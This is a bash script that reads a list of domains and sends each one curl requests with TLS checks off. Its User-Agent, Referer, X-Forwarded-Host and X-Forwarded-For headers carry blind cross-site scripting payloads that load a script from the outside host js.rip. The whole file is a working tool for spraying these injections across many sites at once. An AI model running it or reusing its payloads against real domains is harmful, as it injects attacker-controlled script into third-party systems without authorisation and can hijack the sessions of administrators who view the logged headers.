#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <domain_file>"
    exit 1
fi

domain_file="$1"

user_agent="'><script src=//js.rip/rt17z79c41></script>"
referer="'><script src=//js.rip/rt17z79c41></script>"
x_forwarded_host="'><script src=//js.rip/rt17z79c41></script"
x_forwarded_for="'><script src=//js.rip/rt17z79c41></script>"
user_agent_1="';\"><script/src=//js.rip/rt17z79c41/"
referer_1="';\"><script/src=//js.rip/rt17z79c41/"
x_forwarded_host_1="';\"><script/src=//js.rip/rt17z79c41/"
x_forwarded_for_1="';\"><script/src=//js.rip/rt17z79c41/"

# Loop through each domain in the file and send the HTTP request with custom headers
while IFS= read -r domain; do
    url="${domain}"

    echo "Sending request to: $url"

    # Using curl to send the request with predefined headers and payload
    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent" \
         -H "Referer: $referer" \
         -H "X-Forwarded-Host: $x_forwarded_host" \
         -H "X-Forwarded-For: $x_forwarded_for"

    curl --insecure -X GET "$url" \
         -H "User-Agent: $user_agent_1" \
         -H "Referer: $referer_1" \
         -H "X-Forwarded-Host: $x_forwarded_host_1" \
         -H "X-Forwarded-For: $x_forwarded_for_1"
 
done < "$domain_file"
